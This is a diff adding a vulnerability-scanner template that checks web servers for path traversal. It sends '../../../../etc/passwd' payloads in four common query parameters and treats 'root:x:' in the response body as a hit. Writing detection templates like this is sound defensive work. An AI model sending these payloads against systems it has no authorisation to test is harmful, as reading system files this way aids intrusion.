@@ -1,0 +1,26 @@
+id: vf-critical-path-traversal-01
+name: Path Traversal Detection
+severity: high
+
+description: >
+  Detects potential path traversal through common file and path parameters.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../../etc/passwd"
+
+    headers:
+      Accept: text/plain,application/json,*/*
+
+    matchers:
+      - type: status
+        status: 200
+
+      - type: word
+        part: body
+        words:
+          - "root:x:"
